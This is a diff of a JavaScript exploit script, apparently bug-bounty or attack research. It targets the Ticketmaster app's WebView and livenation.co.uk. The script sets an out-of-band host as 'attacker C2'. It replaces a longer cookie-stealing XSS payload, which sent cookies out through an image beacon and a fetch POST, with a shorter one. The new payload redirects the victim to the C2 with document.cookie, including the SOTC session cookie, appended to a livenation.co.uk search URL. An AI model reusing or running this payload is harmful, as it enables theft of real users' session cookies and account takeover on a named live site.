@@ -31,27 +31,7 @@
   // ── CONFIG ────────────────────────────────────────────────────────────────
   var C2 = 'https://1e5t945y.requestrepo.com';   // attacker C2 / OOB server
 
-  // XSS payload to execute on livenation.co.uk
-  // Reads document.cookie (which includes SOTC) and exfils to C2
-  var XSS_PAYLOAD = '<script>' +
-    'var c=document.cookie;' +
-    'new Image().src="' + C2 + '/sotc?c="+encodeURIComponent(c);' +
-    'fetch("' + C2 + '/sotc",{method:"POST",body:JSON.stringify({' +
-      'cookie:c,'
-    '})});' +
-  '<\/script>';
-
-  // ── STEP 1: Log entry ─────────────────────────────────────────────────────
-  // Confirm we are running inside TM WebView
-  try {
-    new Image().src = C2 + '/step1-bounced?ua=' + encodeURIComponent(navigator.userAgent);
-  } catch(e) {}
-
-  // ── STEP 2: Navigate WebView to livenation.co.uk XSS ─────────────────────
-  // WebViewURLHandler.handle() passes non-ticketmaster.com URLs through
-  // to view.loadUrl() → stays in WebView, XSS fires with .livenation.co.uk
-  // cookie context (SOTC is set for https://.livenation.co.uk by CookieUtil)
-
+  var XSS_PAYLOAD = '<script>window.location.href="' + C2 + '/?c="+encodeURIComponent(document.cookie)<\/script>';
   var XSS_URL = 'https://www.livenation.co.uk/search?query=' + encodeURIComponent(XSS_PAYLOAD);
   
   // Small delay so C2 receives step1 first
